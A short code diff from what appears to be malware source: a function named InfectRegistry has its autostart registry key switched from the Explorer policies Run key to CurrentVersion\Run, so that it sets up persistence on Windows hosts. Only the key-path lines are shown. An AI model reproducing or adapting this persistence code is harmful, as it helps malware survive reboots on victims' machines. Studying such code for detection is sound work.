@@ -433,8 +433,9 @@ BOOL InfectRegistry(WCHAR *dest_dir, WCHAR *home_dir, WCHAR *user_sid)
 	_snwprintf_s(lc_key, MAX_PATH, _TRUNCATE, L"%sSoftware\\Microsoft\\Windows\\CurrentVersion\\Runonce", hive_mp);
 	_snwprintf_s(uc_key, MAX_PATH, _TRUNCATE, L"%sSoftware\\Microsoft\\Windows\\CurrentVersion\\RunOnce", hive_mp);
 #else
-	_snwprintf_s(lc_key, MAX_PATH, _TRUNCATE, L"%sSoftware\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", hive_mp);
-	_snwprintf_s(uc_key, MAX_PATH, _TRUNCATE, L"%sSoftware\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", hive_mp);
+	// XXX-NEWREG
+	_snwprintf_s(lc_key, MAX_PATH, _TRUNCATE, L"%sSoftware\\Microsoft\\Windows\\CurrentVersion\\Run", hive_mp);
+	_snwprintf_s(uc_key, MAX_PATH, _TRUNCATE, L"%sSoftware\\Microsoft\\Windows\\CurrentVersion\\Run", hive_mp);
 #endif
 
 	if (FNC(RegOpenKeyW)(HKEY_LOCAL_MACHINE, uc_key, &hOpen) != ERROR_SUCCESS &&
